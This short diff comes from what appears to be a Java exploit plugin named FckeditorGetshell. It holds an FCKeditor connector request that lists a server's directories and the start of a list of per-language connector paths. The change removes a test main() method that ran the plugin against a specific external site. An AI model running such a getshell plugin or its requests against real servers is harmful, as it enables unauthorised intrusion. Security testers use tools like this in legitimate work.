@@ -37,14 +37,6 @@ public class FckeditorGetshell extends CommonPlugin {
 
     public static String _simple = "editor/filemanager/browser/default/connectors/jsp/connector?Command=GetFoldersAndFiles&Type=/&CurrentFolder=%2F";
 
-    public static void main(String[] args) {
-
-        FckeditorGetshell f = new FckeditorGetshell();
-        f.setParam(new HashMap(){{put("url","http://toekprim.ru/FCKeditor/");}});
-        f.executor();
-        System.out.println(f.result);
-    }
-
     enum Lang{
         PHP(
                 "editor/filemanager/browser/default/connectors/php/connector.php",
